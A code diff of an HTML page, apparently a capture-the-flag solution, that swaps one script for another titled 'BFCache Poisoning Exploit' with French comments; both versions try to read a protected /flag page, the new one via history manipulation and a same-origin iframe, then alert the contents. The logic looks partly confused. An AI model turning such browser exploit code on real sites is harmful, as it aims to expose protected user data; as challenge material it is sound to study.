@@ -1,26 +1,39 @@
 <!DOCTYPE html>
 <html>
-<head>
-<script>
-let flag = null;
+  <body>
+    <h1>BFCache Poisoning Exploit</h1>
+    <script>
+      async function poison() {
+        // 1. Ajouter /flag à l'historique
+        history.pushState({}, "", "/flag");
 
-window.addEventListener('load', () => {
-  fetch('/flag', { credentials: 'include' })
-    .then(response => response.text())
-    .then(data => {
-      flag = data;
-      setTimeout(() => { window.location.href = 'pageB.html'; }, 500);
-    });
-});
+        // 2. Attendre un court instant pour que /flag se charge en mémoire
+        await new Promise(r => setTimeout(r, 1000));
 
-window.addEventListener('pageshow', (event) => {
-  if (event.persisted && flag) {
-    document.body.innerText = flag;
-  }
-});
-</script>
-</head>
-<body>
-Loading...
-</body>
+        // 3. Revenir en arrière (la page /flag est dans le bfcache)
+        history.back();
+
+        // 4. Attendre que la page soit revenue
+        window.addEventListener("pageshow", async (e) => {
+          if (e.persisted) {
+            // 5. Essayer de charger le contenu de /flag via une iframe
+            const iframe = document.createElement("iframe");
+            iframe.src = "/flag";
+            iframe.onload = () => {
+              try {
+                const doc = iframe.contentDocument || iframe.contentWindow.document;
+                const content = doc.body.innerText;
+                alert("FLAG: " + content);
+              } catch (err) {
+                console.error("Impossible d'accéder à l'iframe:", err);
+              }
+            };
+            document.body.appendChild(iframe);
+          }
+        });
+      }
+
+      poison();
+    </script>
+  </body>
 </html>
